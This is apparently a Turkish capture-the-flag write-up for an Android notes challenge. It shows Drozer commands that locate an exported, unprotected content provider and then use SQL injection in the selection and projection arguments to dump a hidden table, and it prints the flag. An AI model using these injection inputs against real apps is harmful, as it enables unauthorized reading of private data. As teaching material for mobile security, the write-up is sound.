## Soru İsmi: GizliNotlar

## Soru Metni: 

Bayrak notların arasındaymış öyle dediler.

## Çözüm: 

Verilen not uygulaması emulatöre (API 22 iş görecektir) yüklenip çalıştırıldığında ekranda örnek bir not görülecektir. 
Kullanıcı varolan notu editleyip kaydedebilmekte ve yeni not oluşturabilmektedir. 
Dolayısıyla arkada bir veri tabanı bulunduğu anlaşılmaktadır. 
Seçenekler kısmından Secure tuşuna basıldığında kullanıcıdan parola istenmektedir. 
İlk bakışta buraya brute force yapmak akla gelebilir fakat bu yöntem ile parolanın makul bir zaman içinde çözülmesi mümkün değildir. 
Uygulamada herhangi bir güvenlik açığı olup olmadığını tespit etmek için Drozer isimli güvenlik değerlendirme aracı kullanılabilir. 

Aşağıdaki adımlar izlenir:

1. drozer.apk emulatöre yüklenir. Drozer uygulaması açılır ve sağ aşağıdaki tuş ile ‘ON’ konumuna getirilir.

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s1.png)
![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s2.png)

2. Emulatörde çalışan uygulama ile komut satırı üzerinden haberleşebilmek için drozer uygulaması bilgisayarımızda da yüklü olmalıdır. 
Yüklendikten sonra, emulatörde hazır bulunan drozer ile bağlantı kurulabilmesi için komut satırından aşağıdaki komutlar çalıştırılır:

`adb forward tcp:31415 tcp:31415`

`drozer console connect`

3. Uygulamayı incelemeye hazırız. Uygulamaya ait package’ı aşağıdaki şekilde buluyoruz.

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s3.png)

4. Package hakkında genel bilgileri görüntülemek için:

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s4.png)

5. Uygulamanın manifest’ini inceliyoruz ve export edilmiş bir Contentprovider olduğunu fark ediyoruz. 

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s5.png)

6. Aynı şekilde uygulamaya ait atak yüzeylerine baktığımızda 1 content provider’ın export edildiğini tekrar görüyoruz.

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s6.png)

7. Uygulamaya ait provider infoya baktığımızda, Authority olarak “com.mfc.secretnotes.contentprovider”’ı görüyoruz. 
Herhangi bir Read/Write permission’u tanımlanmamış.

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s7.png)

8. Uygulamaya ait Drozer’ın erişebildiği/bulabildiği content URI’larına bakarsak:

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s8.png)

**content://com.mfc.secretnotes.contentprovider/notes/** 'ın erişilebilir olduğunu görüyoruz.

9. Bu URI’ya query attığımızda aşağıdaki gibi erişim sağlayabiliyoruz.

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s9.png)

10. Burada bir SQL Injection denemesi yapıyoruz ve aşağıdaki komutun da sorunsuz çalıştığını fark ediyoruz.

`run app.provider.query content://com.mfc.secretnotes.contentprovider/notes/  --selection "_id=1 or 1=1"`

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s10.png)

11. Sistemde SQL injection zaafiyeti olduğunu fark ettik. Aynı şekilde selection yerine projection kısmına bir deneme yapıyoruz: 

`run app.provider.query content://com.mfc.secretnotes.contentprovider/notes/ --projection "* from sqlite_master;"`

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s11.png)

12. Burada **secretnotessecure** isimli başka bir table daha olduğunu görüyoruz. Buraya bir sorgu attığımızda:

`run app.provider.query content://com.mfc.secretnotes.contentprovider/notes/ --projection "* from secretnotessecure;"`

![Preview](https://github.com/stmctf/stmctf18/blob/master/onlineWriteup/MOB/GizliNotlar/s12.png)

Flag **STMCTF{C0k_g1zl1_ve_c0k_guv3nl1_b!Lg1}** karşımıza çıkıyor.
